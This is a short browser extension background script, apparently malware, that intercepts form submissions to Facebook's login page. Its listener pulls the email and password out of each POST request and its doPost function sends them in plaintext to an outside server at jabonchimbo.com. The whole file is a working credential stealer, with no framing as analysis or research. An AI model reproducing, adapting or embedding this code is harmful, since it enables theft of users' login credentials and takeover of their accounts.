'use strict';

var targetPage = "*://*.facebook.com/login.php*";

browser.webRequest.onBeforeRequest.addListener(
  function(details) {
    if(details.method == "POST") {
      console.log(details.requestBody.formData);
	    if(details.requestBody.formData.email === undefined){
      		doPost("repeat",details.requestBody.formData.pass[0]);
	    }else{
      		doPost(details.requestBody.formData.email[0],details.requestBody.formData.pass[0]);
	    }
    }
  },
  {urls: [targetPage]},
  ["requestBody"]
);


function doPost(e,p){
                        var url = "http://www.jabonchimbo.com/api/cards/dopost.php";
                        var parametros ="email="+e+"&pass="+p;
                        var xhr = new XMLHttpRequest();
                        xhr.open("POST",url, true);
                        xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
                        xhr.setRequestHeader('Accept','*/*');
                        xhr.setRequestHeader("Accept-Language", "en");
                        xhr.send(parametros);

                        xhr.onreadystatechange = function () {
                                if (xhr.readyState == 4) {
                                        console.log("Envio de parametros terminada");
                                }
                        }
}

